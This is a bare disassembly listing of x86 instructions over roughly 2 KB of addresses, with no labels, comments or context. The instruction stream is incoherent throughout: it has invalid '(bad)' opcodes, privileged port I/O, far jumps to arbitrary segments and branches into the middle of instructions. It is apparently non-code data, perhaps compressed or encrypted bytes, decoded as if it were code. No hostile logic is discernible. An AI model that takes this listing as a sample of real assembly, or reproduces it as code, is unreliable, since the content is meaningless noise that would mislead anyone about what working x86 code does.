  41fbe2:	dec    edx
  41fbe3:	inc    ebp
  41fbe4:	jo     0x41fc1c
  41fbe6:	in     al,dx
  41fbe7:	adc    eax,0xed94caa0
  41fbec:	stos   BYTE PTR es:[edi],al
  41fbed:	out    dx,al
  41fbee:	test   eax,0x27969b5
  41fbf3:	je     0x41fc74
  41fbf5:	pop    ebx
  41fbf6:	or     al,0xcb
  41fbf8:	loope  0x41fc2d
  41fbfa:	dec    esp
  41fbfb:	int3   
  41fbfc:	and    eax,0xbd3acbf3
  41fc01:	xor    BYTE PTR [edi],dh
  41fc03:	jns    0x41fc37
  41fc05:	mov    cl,0x47
  41fc07:	fs (bad) 
  41fc0a:	test   BYTE PTR [ecx+0x14],dl
  41fc0d:	rcr    BYTE PTR [eax-0x2ae9cd9c],0xde
  41fc14:	push   eax
  41fc15:	cs mov edi,0xa68f8f4e
  41fc1b:	adc    eax,DWORD PTR [edx]
  41fc1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc1e:	mov    esp,0x84c73eb3
  41fc23:	sahf   
  41fc24:	lods   al,BYTE PTR ds:[esi]
  41fc25:	mov    BYTE PTR [eax],bh
  41fc27:	lea    ebp,[edi+0x4a]
  41fc2a:	test   DWORD PTR [esi-0x66],0x9480d9b3
  41fc31:	inc    eax
  41fc32:	sub    DWORD PTR [edi+edx*2],esi
  41fc35:	jmp    0x41fc32
  41fc37:	out    0x42,eax
  41fc39:	out    dx,eax
  41fc3a:	loope  0x41fbbf
  41fc3c:	js     0x41fc2a
  41fc3e:	iret   
  41fc3f:	leave  
  41fc40:	fild   DWORD PTR [ebp+0x58]
  41fc43:	mov    esi,0xf62f1132
  41fc48:	push   0x2416beda
  41fc4d:	add    ah,BYTE PTR [ebx]
  41fc4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc50:	in     al,dx
  41fc51:	nop
  41fc52:	mov    cl,0x15
  41fc54:	(bad)  
  41fc55:	setle  cl
  41fc58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc59:	xor    ecx,DWORD PTR [eax]
  41fc5b:	in     al,dx
  41fc5c:	fadd   QWORD PTR ds:0xa8b97e44
  41fc62:	push   ecx
  41fc63:	xor    BYTE PTR [ebx+0x6d95a32d],0x3
  41fc6a:	inc    esi
  41fc6b:	inc    esp
  41fc6c:	jmp    0xc923803a
  41fc71:	int    0xfe
  41fc73:	stc    
  41fc74:	repnz test edx,ebx
  41fc77:	aam    0xd3
  41fc79:	repnz sbb BYTE PTR [eax],bh
  41fc7c:	ins    BYTE PTR es:[edi],dx
  41fc7d:	fld    DWORD PTR [eax-0x5a905b86]
  41fc83:	cmp    eax,DWORD PTR [eax+0x3891d78c]
  41fc89:	xor    al,0xf7
  41fc8b:	dec    edi
  41fc8c:	xor    bh,BYTE PTR [edx+0x672530d3]
  41fc92:	push   es
  41fc93:	rcr    BYTE PTR [edx],1
  41fc95:	ret    0x8d09
  41fc98:	sub    al,0xed
  41fc9a:	mov    dl,0xdb
  41fc9c:	inc    ecx
  41fc9d:	adc    eax,0xf63b0d90
  41fca2:	cli    
  41fca3:	test   BYTE PTR [ebx],ch
  41fca5:	in     eax,0x6
  41fca7:	inc    BYTE PTR [ebp-0x56]
  41fcaa:	sbb    eax,DWORD PTR [eax]
  41fcac:	bound  eax,QWORD PTR [edx+ebp*4+0x72737e71]
  41fcb3:	stos   BYTE PTR es:[edi],al
  41fcb4:	dec    eax
  41fcb5:	xchg   esp,eax
  41fcb6:	ja     0x41fcf2
  41fcb8:	xchg   BYTE PTR [ebp-0x45],dl
  41fcbb:	retf   
  41fcbc:	mov    ecx,0xa91ea980
  41fcc1:	pop    eax
  41fcc2:	push   0xffffffec
  41fcc4:	push   es
  41fcc5:	fidivr WORD PTR [edi]
  41fcc7:	aas    
  41fcc8:	in     eax,dx
  41fcc9:	out    0xd6,al
  41fccb:	addr16 mov dh,0x13
  41fcce:	pop    esi
  41fccf:	mov    BYTE PTR [edx-0x22],dl
  41fcd2:	and    BYTE PTR [edi+0x40],dh
  41fcd5:	jns    0x41fd31
  41fcd7:	pop    ebx
  41fcd8:	call   0x9d83:0x65879775
  41fcdf:	cdq    
  41fce0:	bound  esp,QWORD PTR [ebp+0x46f2620c]
  41fce6:	push   0x482b94aa
  41fceb:	jb     0x41fce9
  41fced:	mov    ebx,0x20be911c
  41fcf2:	pop    es
  41fcf3:	and    edx,DWORD PTR [ecx-0x70caee07]
  41fcf9:	aad    0x7c
  41fcfb:	xchg   edi,eax
  41fcfc:	mov    dl,BYTE PTR [ebp+0x101b1241]
  41fd02:	or     ebx,edx
  41fd04:	repz lock inc esi
  41fd07:	push   ss
  41fd08:	mov    ebp,DWORD PTR [ebp+0x27]
  41fd0b:	retf   0xaaeb
  41fd0e:	jne    0x41fcb5
  41fd10:	repnz mov dl,0xcf
  41fd13:	mov    al,0xcf
  41fd15:	xor    al,BYTE PTR [ebp-0x53610f86]
  41fd1b:	mov    esp,0x13e3d8e3
  41fd20:	in     eax,dx
  41fd21:	inc    edx
  41fd22:	leave  
  41fd23:	sub    bh,dl
  41fd25:	std    
  41fd26:	mov    eax,0x393ba7df
  41fd2b:	ins    BYTE PTR es:[edi],dx
  41fd2c:	test   BYTE PTR [ecx-0x53],dl
  41fd2f:	sbb    al,0x21
  41fd31:	repnz dec edi
  41fd33:	or     eax,0x978b434a
  41fd38:	mov    dh,0x5b
  41fd3a:	xor    DWORD PTR [ebx+0x2b1e4226],edi
  41fd40:	lods   eax,DWORD PTR ds:[esi]
  41fd41:	ror    BYTE PTR [esp-0x4a],0xc2
  41fd46:	pop    ecx
  41fd47:	add    eax,0xe4b0cf95
  41fd4c:	sbb    BYTE PTR [esi],bl
  41fd4e:	retf   0x44b6
  41fd51:	sub    DWORD PTR [edx-0x27],ebp
  41fd54:	jl     0x41fd3b
  41fd56:	neg    edi
  41fd58:	fs pop ebx
  41fd5a:	jg     0x41fd91
  41fd5c:	ret    
  41fd5d:	mov    cl,0xd4
  41fd5f:	push   ds
  41fd60:	rcr    BYTE PTR [edx-0x34],0xe4
  41fd64:	cmc    
  41fd65:	lea    ebp,[ebx+0x8]
  41fd68:	mov    DWORD PTR [ecx],0x9166699e
  41fd6e:	out    dx,al
  41fd6f:	cmp    al,0x5e
  41fd71:	sti    
  41fd72:	shr    DWORD PTR [ebp-0x30],1
  41fd75:	xor    ah,BYTE PTR [eax]
  41fd77:	jmp    0x929b:0x8fd0b0bf
  41fd7e:	sub    ebx,edi
  41fd80:	and    dh,BYTE PTR [edx+0x7f]
  41fd83:	mov    BYTE PTR [edx+0x2d84eb14],ch
  41fd89:	xor    al,0x82
  41fd8b:	xchg   ebx,eax
  41fd8c:	cmp    BYTE PTR [ebx+0x3],bh
  41fd8f:	mov    ah,0x83
  41fd91:	and    dh,BYTE PTR [esi]
  41fd93:	mov    cl,0x50
  41fd95:	mov    ebp,DWORD PTR [ecx]
  41fd97:	sar    DWORD PTR [esi],1
  41fd99:	or     BYTE PTR [ebx-0x277a42ae],0xcc
  41fda0:	fwait
  41fda1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fda2:	outs   dx,BYTE PTR ds:[esi]
  41fda3:	ds jecxz 0x41fd5e
  41fda6:	adc    eax,0xfe274ecb
  41fdab:	add    eax,0x572b8b21
  41fdb0:	cmp    eax,0x8095bc03
  41fdb5:	or     al,0xee
  41fdb7:	popf   
  41fdb8:	push   ecx
  41fdb9:	adc    eax,0x9c792a02
  41fdbe:	in     eax,0x7
  41fdc0:	jb     0x41fdeb
  41fdc2:	inc    ebp
  41fdc3:	push   0x65
  41fdc5:	pop    ss
  41fdc6:	sahf   
  41fdc7:	fdiv   QWORD PTR [edi+eax*1-0x15]
  41fdcb:	push   0x22862023
  41fdd0:	daa    
  41fdd1:	mov    DWORD PTR [ebx-0x34],ecx
  41fdd4:	ins    BYTE PTR es:[edi],dx
  41fdd5:	xor    esi,DWORD PTR [edi+0x37]
  41fdd8:	push   esp
  41fdd9:	pusha  
  41fdda:	sbb    al,0x68
  41fddc:	xor    al,0x27
  41fdde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fddf:	xor    BYTE PTR [edi],ah
  41fde1:	cli    
  41fde2:	sbb    DWORD PTR [edi+0x4fe64cd5],ebp
  41fde8:	or     eax,0x97b6f168
  41fded:	xchg   BYTE PTR [ebx-0x2],ah
  41fdf0:	sar    ebp,1
  41fdf2:	adc    eax,0xf8098eab
  41fdf7:	(bad)  
  41fdf8:	ficom  DWORD PTR [eax]
  41fdfa:	shl    DWORD PTR [esi+0x4e],cl
  41fdfd:	scas   al,BYTE PTR es:[edi]
  41fdfe:	mov    bh,BYTE PTR [ecx+0x35]
  41fe01:	xor    ecx,DWORD PTR [edx-0x18]
  41fe04:	or     esp,DWORD PTR [ebx]
  41fe06:	xor    DWORD PTR [eax+0x6d],ebx
  41fe09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe0a:	jno    0x41fdc9
  41fe0c:	js     0x41fe06
  41fe0e:	jo     0x41fe5d
  41fe10:	out    dx,al
  41fe11:	inc    esp
  41fe12:	shl    esi,1
  41fe14:	mov    edi,0x9dc4f031
  41fe19:	retf   0x23c5
  41fe1c:	or     al,0xb3
  41fe1e:	sub    ecx,DWORD PTR [edi-0xc4546bb]
  41fe24:	add    edi,esi
  41fe26:	out    dx,al
  41fe27:	sahf   
  41fe28:	aaa    
  41fe29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe2a:	scas   al,BYTE PTR es:[edi]
  41fe2b:	mov    bh,0x9d
  41fe2d:	or     eax,0x32d7f8bd
  41fe32:	jecxz  0x41fe23
  41fe34:	faddp  st(1),st
  41fe36:	push   eax
  41fe37:	cmp    cl,ch
  41fe39:	sbb    BYTE PTR [edi+0x15559d9f],dh
  41fe3f:	mov    ecx,0x14fa2ac
  41fe44:	hlt    
  41fe45:	loopne 0x41fddb
  41fe47:	sub    BYTE PTR [ebx+0x17],cl
  41fe4a:	jns    0x41fe0b
  41fe4c:	or     al,0xb2
  41fe4e:	aam    0x37
  41fe50:	aaa    
  41fe51:	dec    edi
  41fe52:	aam    0x25
  41fe54:	in     eax,dx
  41fe55:	aaa    
  41fe56:	and    DWORD PTR [esi-0x7],ebx
  41fe59:	mov    ebp,0x6f423714
  41fe5e:	and    eax,0xc8b3786
  41fe63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe64:	mov    bl,0xdb
  41fe66:	out    dx,al
  41fe67:	fld    DWORD PTR [ebx+eax*1-0x79]
  41fe6b:	lock mov ecx,DWORD PTR [edi+0x222c2f]
  41fe72:	push   edx
  41fe73:	jp     0x41fe53
  41fe75:	lods   al,BYTE PTR ds:[esi]
  41fe76:	lahf   
  41fe77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe78:	add    edx,esp
  41fe7a:	test   BYTE PTR [ebp-0x5d820d27],ch
  41fe80:	in     eax,0xfc
  41fe82:	dec    ecx
  41fe83:	push   ebp
  41fe84:	xor    al,0x1d
  41fe86:	mov    edi,DWORD PTR [esi]
  41fe88:	inc    ebx
  41fe89:	xchg   DWORD PTR ds:0x9d3336f2,esi
  41fe8f:	sbb    cl,BYTE PTR [ebx+0x1a859830]
  41fe95:	leave  
  41fe96:	idiv   BYTE PTR [ecx+0x29]
  41fe99:	popf   
  41fe9a:	mov    cl,0xcc
  41fe9c:	jmp    0xf2e8:0x48cd4079
  41fea3:	pusha  
  41fea4:	jmp    0xb034ca04
  41fea9:	sub    al,0xd2
  41feab:	bound  ebp,QWORD PTR [ebp+0x44]
  41feae:	mov    eax,ds:0x5512a5af
  41feb3:	(bad)  
  41feb4:	in     eax,dx
  41feb5:	sbb    BYTE PTR [eax+edx*8+0x1a],bl
  41feb9:	add    eax,0x2597d0e5
  41febe:	sub    ebx,edx
  41fec0:	popa   
  41fec1:	pop    eax
  41fec2:	sbb    DWORD PTR [ecx],edx
  41fec4:	(bad)  
  41fec5:	sub    ecx,ebx
  41fec7:	add    dh,BYTE PTR [esi-0x2b6d9130]
  41fecd:	xchg   ecx,eax
  41fece:	dec    ecx
  41fecf:	mov    edi,0xc744ffd7
  41fed4:	or     ecx,DWORD PTR [ecx+0x52]
  41fed7:	mov    dh,0xc7
  41feda:	mov    dh,0x86
  41fedc:	sbb    al,0xdd
  41fede:	outs   dx,BYTE PTR ds:[esi]
  41fedf:	aad    0xca
  41fee1:	pop    esp
  41fee2:	data16 out 0x65,al
  41fee5:	push   0xffffff8a
  41fee7:	pushf  
  41fee8:	inc    ebx
  41fee9:	push   ebx
  41feea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feeb:	(bad)  
  41feec:	jmp    0x622ec1b7
  41fef1:	pop    eax
  41fef2:	lahf   
  41fef3:	mov    ecx,ebx
  41fef5:	leave  
  41fef6:	out    dx,al
  41fef7:	add    cl,dh
  41fef9:	xor    BYTE PTR [ebp+0x61],dh
  41fefc:	cdq    
  41fefd:	mul    BYTE PTR es:[ebx-0x184f8d95]
  41ff04:	jp     0x41fee8
  41ff06:	jle    0x41ff4a
  41ff08:	xchg   edx,eax
  41ff09:	fstp   QWORD PTR [esi]
  41ff0b:	mov    dl,0xbe
  41ff0d:	fisttp DWORD PTR ds:0x7ce1795b
  41ff13:	sub    esi,edi
  41ff15:	xor    ebp,ebp
  41ff17:	(bad)  
  41ff18:	sbb    al,0x1d
  41ff1a:	xchg   ebx,eax
  41ff1b:	mov    ecx,eax
  41ff1d:	xchg   dh,ch
  41ff1f:	mov    bh,0xf7
  41ff21:	stos   BYTE PTR es:[edi],al
  41ff22:	fistp  WORD PTR [eax]
  41ff24:	and    esi,DWORD PTR [edi]
  41ff26:	push   edi
  41ff27:	loope  0x41ff98
  41ff29:	inc    DWORD PTR [eax]
  41ff2b:	addr16 inc ebp
  41ff2d:	dec    esp
  41ff2e:	jl     0x41ff04
  41ff30:	cmp    al,0xa1
  41ff32:	sti    
  41ff33:	icebp  
  41ff34:	cmp    al,0x49
  41ff36:	test   eax,0x4c8b5ebb
  41ff3b:	sbb    DWORD PTR [ecx],ebp
  41ff3d:	mov    ebp,0x2c1412e8
  41ff42:	and    esi,esi
  41ff44:	sbb    DWORD PTR [esi-0x24],0x18266a9a
  41ff4b:	mov    cl,0x70
  41ff4d:	mov    al,0x8a
  41ff4f:	loopne 0x41ff08
  41ff51:	fldenv [edx+0x38510fa7]
  41ff57:	mov    dh,0x61
  41ff59:	cmp    al,0x5d
  41ff5b:	div    esi
  41ff5d:	adc    al,0x47
  41ff5f:	push   ebx
  41ff60:	ficom  DWORD PTR ds:0x52a06e0d
  41ff66:	jge    0x41ff27
  41ff68:	xor    bl,BYTE PTR [esi+0x30]
  41ff6b:	dec    ebx
  41ff6c:	fistp  WORD PTR [ecx]
  41ff6e:	mov    edi,0x3e7d092a
  41ff73:	cmp    eax,DWORD PTR [ebx]
  41ff75:	shr    DWORD PTR [edi-0x17],0xcd
  41ff79:	mov    esi,0x214dab1
  41ff7e:	adc    al,0xf0
  41ff80:	(bad)  
  41ff81:	stc    
  41ff82:	mov    edx,0x5eb2fc59
  41ff87:	in     eax,dx
  41ff88:	xor    BYTE PTR [edx],bh
  41ff8a:	and    eax,DWORD PTR [eax-0x14]
  41ff8d:	icebp  
  41ff8e:	or     eax,0x7b84ac0f
  41ff93:	lods   eax,DWORD PTR ds:[esi]
  41ff94:	addr16 out dx,al
  41ff96:	ror    BYTE PTR [ecx+0x8e61f9c],0x6c
  41ff9d:	jns    0x41ffa0
  41ff9f:	fwait
  41ffa0:	daa    
  41ffa1:	add    cl,BYTE PTR [ebp-0x65]
  41ffa4:	out    dx,eax
  41ffa5:	cmc    
  41ffa6:	scas   eax,DWORD PTR es:[edi]
  41ffa7:	sti    
  41ffa8:	mov    ebp,0x6e70a955
  41ffad:	je     0x41ff5a
  41ffaf:	pop    edi
  41ffb0:	xor    eax,0xb6c31d40
  41ffb5:	jne    0x41ffa7
  41ffb7:	jb     0x420035
  41ffb9:	pop    esi
  41ffba:	or     BYTE PTR [esi],al
  41ffbc:	pusha  
  41ffbd:	cmp    eax,0xda602c57
  41ffc2:	std    
  41ffc3:	add    al,0x24
  41ffc5:	lahf   
  41ffc6:	(bad)  [edx+ebx*2+0x7533d125]
  41ffcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffce:	pop    edx
  41ffcf:	lods   eax,DWORD PTR ds:[esi]
  41ffd0:	sbb    al,cl
  41ffd2:	jne    0x41ff72
  41ffd4:	lods   eax,DWORD PTR ds:[esi]
  41ffd5:	pusha  
  41ffd6:	inc    esp
  41ffd7:	pop    eax
  41ffd8:	neg    BYTE PTR [ebx+0x25f734ab]
  41ffde:	push   edi
  41ffdf:	fidivr WORD PTR [esi]
  41ffe1:	int    0xdf
  41ffe3:	adc    ebx,DWORD PTR [edx+0x34]
  41ffe6:	pop    es
  41ffe7:	adc    dl,BYTE PTR [esi]
  41ffe9:	ret    0x7b8c
  41ffec:	mov    eax,0xac203228
  41fff1:	fnstcw WORD PTR [eax]
  41fff3:	jne    0x42004e
  41fff5:	loop   0x420019
  41fff7:	pop    ecx
  41fff8:	imul   ebp,DWORD PTR [eax],0x42b7dc93
  41fffe:	mov    esp,0x13f02f6b
  420003:	test   BYTE PTR [edi-0x22],dh
  420006:	push   ds
  420007:	shl    eax,0xb1
  42000a:	fs pusha 
  42000c:	cmp    al,0x38
  42000e:	cld    
  42000f:	mov    ds:0xa7a7b640,al
  420014:	add    al,0x46
  420016:	pop    ds
  420017:	repz add al,0x53
  42001a:	ror    eax,1
  42001c:	mov    ds:0xafaff12e,al
  420021:	dec    esp
  420022:	mov    dl,0xb4
  420024:	aad    0x1f
  420026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420027:	pop    es
  420028:	shr    BYTE PTR [ebp+0x3d],cl
  42002b:	pop    eax
  42002c:	push   ss
  42002d:	(bad)  
  42002e:	dec    eax
  42002f:	add    al,0xe2
  420031:	cdq    
  420032:	fwait
  420033:	mov    edi,0xc1be8fa3
  420038:	sub    esi,DWORD PTR [eax]
  42003a:	lds    eax,FWORD PTR [esp+edx*8]
  42003d:	repz ja 0x420066
  420040:	repz xor DWORD PTR [ecx],esi
  420043:	lods   al,BYTE PTR ds:[esi]
  420044:	mov    eax,ds:0xfabc91ca
  420049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42004a:	stos   DWORD PTR es:[edi],eax
  42004b:	sub    DWORD PTR [eax],esi
  42004d:	in     al,0xf6
  42004f:	aaa    
  420050:	push   es
  420051:	sbb    eax,0xf23f5c4f
  420056:	jge    0x42002a
  420058:	sar    BYTE PTR [esi],0xa9
  42005b:	jl     0x420066
  42005d:	popf   
  42005e:	mov    ebp,0x4a2526ce
  420063:	jg     0x420000
  420065:	call   0xc5c547e6
  42006a:	add    al,0x9
  42006c:	jnp    0x41fff3
  42006e:	jge    0x4200d2
  420070:	cmp    eax,0x5d4bf48
  420075:	xor    DWORD PTR [edi-0x7e9b5e75],ebp
  42007b:	xor    DWORD PTR [ebp-0x9de0e64],esp
  420081:	fst    DWORD PTR [ecx-0x3a]
  420084:	dec    ebx
  420085:	imul   esi,DWORD PTR [edx+0x7f],0xffffffa1
  420089:	cld    
  42008a:	inc    edi
  42008b:	out    0x93,eax
  42008d:	pop    ebp
  42008e:	push   ecx
  42008f:	xchg   esp,eax
  420090:	or     al,0xbe
  420092:	and    DWORD PTR [edi],ecx
  420094:	adc    BYTE PTR [eax-0x6b],0x39
  420098:	sbb    BYTE PTR [ecx],0xbb
  42009b:	out    dx,al
  42009c:	mov    esp,DWORD PTR [ecx+0x2]
  42009f:	in     eax,0xcf
  4200a1:	inc    ecx
  4200a2:	and    ecx,DWORD PTR [edx]
  4200a4:	ins    DWORD PTR es:[edi],dx
  4200a5:	push   ebx
  4200a6:	pop    esi
  4200a7:	or     ah,BYTE PTR [esi-0xb98bf0c]
  4200ad:	loope  0x420127
  4200af:	mov    bl,0x8a
  4200b1:	sbb    al,0x5e
  4200b3:	jge    0x420130
  4200b5:	test   al,0xec
  4200b8:	ss jne 0x4200a8
  4200bb:	fidivr DWORD PTR [eax+0x2b2fde9]
  4200c1:	addr16 call 0x15ff:0xcf155b37
  4200c9:	mov    edx,0x5d39bf53
  4200ce:	aam    0x62
  4200d0:	sbb    al,0x57
  4200d2:	sub    BYTE PTR [esi+0x5f1b4400],0x5f
  4200d9:	ins    BYTE PTR es:[edi],dx
  4200da:	xchg   edi,eax
  4200db:	jne    0x4200e9
  4200dd:	push   ebp
  4200de:	jne    0x4200c4
  4200e0:	sbb    edi,DWORD PTR [edx-0x4c3a22b9]
  4200e6:	imul   ebx,DWORD PTR [eax-0x4362c7be],0xa84ac98b
  4200f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200f1:	lea    edi,[eax+esi*8]
  4200f4:	test   al,0x8f
  4200f6:	adc    BYTE PTR [esi+ecx*2+0x31],dh
  4200fa:	and    cl,BYTE PTR [eax+0x3ce6ef68]
  420100:	jmp    0x42017c
  420102:	mov    edx,0x876cf8da
  420107:	mov    dh,0xd
  420109:	retf   0x855
  42010c:	adc    al,0xf7
  42010e:	in     eax,0x78
  420110:	int    0x3c
  420112:	pop    ds
  420113:	jb     0x42010f
  420115:	or     edx,DWORD PTR [eax-0x3ddccdb8]
  42011b:	out    dx,eax
  42011c:	and    BYTE PTR [eax],dh
  42011e:	vaddss xmm0,xmm5,xmm7
  420122:	(bad)  
  420124:	adc    BYTE PTR [edx+0xd],cl
  420127:	pop    edi
  420128:	adc    eax,0x29a8845
  42012d:	fdivrp st(6),st
  42012f:	dec    esi
  420130:	fucomp st(3)
  420132:	sbb    bh,BYTE PTR [eax-0x4ce8435b]
  420138:	loop   0x420154
  42013a:	dec    edx
  42013b:	rcl    dl,cl
  42013d:	adc    BYTE PTR [ecx-0x28],ch
  420140:	test   al,0x6f
  420142:	xlat   BYTE PTR ds:[ebx]
  420143:	(bad)  
  420144:	push   0x85850119
  420149:	rcl    DWORD PTR [edi+esi*2+0x3a],0x40
  42014e:	xchg   edi,eax
  42014f:	mov    cl,0xcb
  420151:	pop    ds
  420152:	xchg   edx,eax
  420153:	scas   eax,DWORD PTR es:[edi]
  420154:	xchg   DWORD PTR [ecx+0x744f3a29],edi
  42015a:	lods   eax,DWORD PTR ds:[esi]
  42015b:	mov    edx,0x1d7bc96b
  420160:	jmp    0x396c:0x1173fca6
  420167:	outs   dx,BYTE PTR ds:[esi]
  420168:	pop    ss
  420169:	ret    
  42016a:	pop    esp
  42016b:	adc    esi,DWORD PTR [ecx]
  42016d:	icebp  
  42016e:	stos   DWORD PTR es:[edi],eax
  42016f:	into   
  420170:	ret    
  420171:	je     0x42018e
  420173:	pop    eax
  420174:	dec    edx
  420175:	(bad)  ds:0x99900693
  42017b:	dec    ecx
  42017c:	xchg   ecx,eax
  42017d:	stos   BYTE PTR es:[edi],al
  42017e:	sysenter 
  420180:	bound  edi,QWORD PTR [edx+0x4]
  420183:	neg    DWORD PTR [edi]
  420185:	fcomip st,st(2)
  420187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420188:	fisubr WORD PTR [edi+ecx*4+0x2f3285aa]
  42018f:	mov    ecx,0x9f0740bd
  420194:	mov    ecx,es
  420196:	test   eax,0x8199601d
  42019b:	loop   0x4201d2
  42019d:	pushf  
  42019e:	ss pusha 
  4201a0:	push   edi
  4201a1:	ins    DWORD PTR es:[edi],dx
  4201a2:	sbb    eax,0x802748d6
  4201a7:	(bad)  
  4201a8:	cmp    ecx,esp
  4201aa:	mov    cl,0x3c
  4201ac:	push   eax
  4201ad:	daa    
  4201ae:	sub    BYTE PTR [eax+0x73a57e6f],bh
  4201b4:	or     ah,dh
  4201b6:	int3   
  4201b7:	or     bh,ch
  4201b9:	inc    ebx
  4201ba:	xor    esi,eax
  4201bc:	cmp    bh,BYTE PTR [ecx+edi*4+0x7f]
  4201c0:	cmp    ecx,ebx
  4201c2:	jne    0x4201a2
  4201c4:	mov    edx,0x2e6cda59
  4201c9:	enter  0x9ffd,0x70
  4201cd:	fwait
  4201ce:	outs   dx,DWORD PTR ds:[esi]
  4201cf:	jae    0x420165
  4201d1:	push   edi
  4201d2:	cmc    
  4201d3:	addr16 call 0xd0014779
  4201d9:	pop    ss
  4201da:	int3   
  4201db:	(bad)  
  4201dc:	outs   dx,BYTE PTR ds:[esi]
  4201dd:	mov    dh,0xf8
  4201df:	lods   al,BYTE PTR ds:[esi]
  4201e0:	retf   
  4201e1:	adc    al,0xd2
  4201e3:	outs   dx,BYTE PTR ds:[esi]
  4201e4:	sub    BYTE PTR [eax+0x1f],al
  4201e7:	sub    al,0x5c
  4201e9:	lock add bl,BYTE PTR [edi+edi*4+0x5a834edd]
  4201f1:	mov    dl,BYTE PTR [ebx]
  4201f3:	push   esp
  4201f4:	mov    DWORD PTR ds:0x38953dd,edx
  4201fa:	cmp    DWORD PTR [ecx+0x46],ebx
  4201fd:	femms  
  4201ff:	(bad)  
  420200:	jmp    0x420189
  420202:	jle    0x4201e8
  420204:	or     eax,0x505c0858
  420209:	loope  0x42018d
  42020b:	cmp    al,0x31
  42020d:	xchg   ecx,eax
  42020e:	out    0x3b,al
  420210:	add    eax,0xe40ffe62
  420215:	gs mov al,0x31
  420218:	ins    DWORD PTR es:[edi],dx
  420219:	lock leave 
  42021b:	test   al,0xe9
  42021d:	add    edi,eax
  42021f:	lods   eax,DWORD PTR ds:[esi]
  420220:	retf   0x75d9
  420223:	test   al,0xf3
  420225:	sub    eax,0xf86711ea
  42022a:	dec    eax
  42022b:	jnp    0x4201f1
  42022d:	add    al,0x55
  42022f:	adc    al,0x92
  420231:	test   DWORD PTR ds:0x8ef746e1,0x39cf90ab
  42023b:	out    0xd8,eax
  42023d:	outs   dx,DWORD PTR ds:[esi]
  42023e:	xor    eax,0x935cff16
  420243:	cmove  ebp,DWORD PTR [eax+0x2f]
  420247:	xor    BYTE PTR [ecx+ebx*1+0x6e],bl
  42024b:	dec    eax
  42024c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42024d:	inc    edi
  42024e:	mov    ecx,0xd56f6a5d
  420253:	pop    eax
  420254:	cmp    ch,BYTE PTR [ebx+0x2eed0150]
  42025a:	fs (bad) 
  42025c:	sbb    ebp,esi
  42025e:	or     BYTE PTR [ebx+esi*2-0x76],ah
  420262:	adc    eax,0xb4675bf9
  420267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420268:	mov    edx,0xae63aca
  42026d:	xchg   edi,eax
  42026e:	xchg   BYTE PTR gs:[ecx+0x117cf92a],ah
  420275:	sar    BYTE PTR [ebx],cl
  420277:	jbe    0x4202bb
  420279:	(bad)  
  42027b:	xchg   BYTE PTR [esi],bh
  42027d:	pop    ecx
  42027e:	pop    eax
  42027f:	jecxz  0x420237
  420281:	fwait
  420282:	(bad)  
  420283:	gs inc ebp
  420285:	test   al,0xae
  420287:	jge    0x42029f
  420289:	pop    esp
  42028a:	mov    eax,DWORD PTR [edi]
  42028c:	jp     0x4202aa
  42028e:	pop    ebx
  42028f:	cwde   
  420290:	repz aam 0x65
  420293:	sahf   
  420294:	and    eax,0x3ecbc0e7
  420299:	or     DWORD PTR ds:0x7564fbef,esp
  42029f:	dec    esp
  4202a0:	aam    0x51
  4202a2:	sub    eax,0xd21b246b
  4202a7:	jp     0x420307
  4202a9:	fdivr  DWORD PTR [ecx+0x0]
  4202ac:	test   DWORD PTR [ebp+esi*2+0x57],ebp
  4202b0:	inc    ebx
  4202b1:	(bad)  
  4202b3:	sahf   
  4202b4:	into   
  4202b5:	cs mov edx,0x58e3a22f
  4202bb:	shl    DWORD PTR [edx],cl
  4202bd:	addr16 mov dh,0x65
  4202c0:	mov    dl,0x20
  4202c2:	jbe    0x42028d
  4202c4:	push   ebp
  4202c5:	xchg   ebx,eax
  4202c6:	sub    DWORD PTR [eax+0x5dd5218e],esp
  4202cc:	add    eax,0x6f76b33f
  4202d1:	pop    eax
  4202d2:	ret    
  4202d3:	mov    ch,0xf0
  4202d5:	mov    DWORD PTR [esi-0x4b],ecx
  4202d8:	shl    BYTE PTR [edx],0x9d
  4202db:	sub    al,0xeb
  4202dd:	aaa    
  4202de:	mov    bl,0x53
  4202e0:	out    dx,eax
  4202e1:	xchg   ecx,eax
  4202e2:	adc    al,0xd7
  4202e4:	xchg   ebp,eax
  4202e5:	inc    ecx
  4202e6:	rol    BYTE PTR [ecx-0x7c892ea],0x48
  4202ed:	jo     0x420364
  4202ef:	or     DWORD PTR [ecx-0x62bf46bf],edi
  4202f5:	adc    BYTE PTR [esi+0x11],0x57
  4202f9:	icebp  
  4202fa:	push   edx
  4202fb:	fisubr WORD PTR [ecx-0x51]
  4202fe:	arpl   WORD PTR [ebp+0x7cfdabb6],sp
  420304:	sub    al,0xd2
  420306:	pop    eax
  420307:	in     al,0x3
  420309:	push   ebp
  42030a:	shl    cl,1
  42030c:	or     BYTE PTR [esi],bh
  42030e:	sbb    DWORD PTR [ebp+0x20042af7],ecx
  420314:	inc    edx
  420315:	addr16 gs pop ebx
  420318:	adc    DWORD PTR [eax-0x76],0x5c
  42031c:	and    eax,0x992989c7
  420321:	xchg   edx,eax
  420322:	add    DWORD PTR [eax-0x55],edx
  420325:	lahf   
  420326:	push   cs
  420327:	mov    eax,0x907ba14c
  42032c:	loope  0x420308
  42032e:	xlat   BYTE PTR ds:[ebx]
  42032f:	inc    ebx
  420330:	mov    al,ds:0xf92c4194
  420335:	adc    bl,0xb5
  420338:	xchg   ecx,eax
